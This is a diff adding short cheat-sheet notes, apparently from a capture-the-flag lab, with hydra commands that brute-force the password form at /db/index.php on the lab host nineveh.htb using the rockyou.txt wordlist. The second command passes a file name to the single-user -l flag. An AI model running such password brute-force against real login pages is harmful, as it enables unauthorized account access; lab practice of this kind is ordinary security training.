@@ -1,0 +1,8 @@
+-- HTTPS Brute Force Form (Password Only) -- 
+hydra -f -l '' -P rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password."
+
+
+-- HTTPS Brute Force Form (username and Password)
+hydra -f -l 'mantap.txt' -P rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password."
+
+ If you want to use http : use 'http-post-form'
